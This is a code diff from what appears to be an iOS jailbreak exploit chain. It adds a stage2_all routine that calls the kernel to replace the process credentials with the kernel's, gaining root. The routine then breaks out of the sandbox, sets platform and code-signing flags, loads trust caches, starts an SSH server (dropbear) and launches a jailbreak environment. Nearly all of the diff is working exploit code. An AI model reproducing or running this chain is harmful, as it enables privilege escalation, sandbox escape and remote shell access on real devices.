@@ -13,6 +13,10 @@
 #include "stage2.h"
 #include "escalate.h"
 #include "sandbox.h"
+#include "trustcache.h"
+#include "krw.h"
+#include "dropbear.h"
+#include "bootstrap.h"
 
 uint64_t mineek_find_port(mach_port_name_t port){
     uint64_t task_addr = get_selftask();
@@ -120,7 +124,7 @@ void mineek_getRoot(uint64_t proc_addr)
     uint64_t proc_set_ucred = off_proc_set_ucred;
     proc_set_ucred += get_kslide();
     printf("[i] func: 0x%llx\n", proc_set_ucred);
-    mineek_kcall(proc_set_ucred, proc_addr, kern_ucred, 0, 0, 0, 0, 0);
+    kcall(proc_set_ucred, proc_addr, kern_ucred, 0, 0, 0, 0, 0);
     setuid(0);
     setuid(0);
     printf("[i] getuid: %d\n", getuid());
@@ -163,7 +167,28 @@ void stage2(void) {
     mineek_getRoot(proc_addr);
     usleep(10000);
     ucred_test(proc_addr);
-    //kalloc_using_empty_kdata_page_stage2();
-    run_unsandboxed((^{unsandbox_stage2();}), pid);
+}
+
+void stage2_all(void) {
+    pid_t pid = getpid();
+    printf("[i] pid = %d\n", pid);
+    uint64_t proc_addr = proc_of_pid(getpid());
+    printf("[i] proc_addr: 0x%llx\n", proc_addr);
+    printf("[i] init_kcall!\n");
     init_kcall();
+    printf("[i] getRoot!\n");
+    mineek_getRoot(proc_addr);
+    usleep(10000);
+    ucred_test(proc_addr);
+    usleep(10000);
+    run_unsandboxed((^{unsandbox_stage2();}), pid);
+    set_task_platform(pid, true);
+    proc_fix_setuid(pid);
+    //set_proc_csflags(pid);
+    set_csb_platform_binary(pid);
+    loadTrustCacheBinpack();
+    loadTrustCacheBinaries();
+    term_kcall();
+    runSSH();
+    startJBEnvironment();
 }
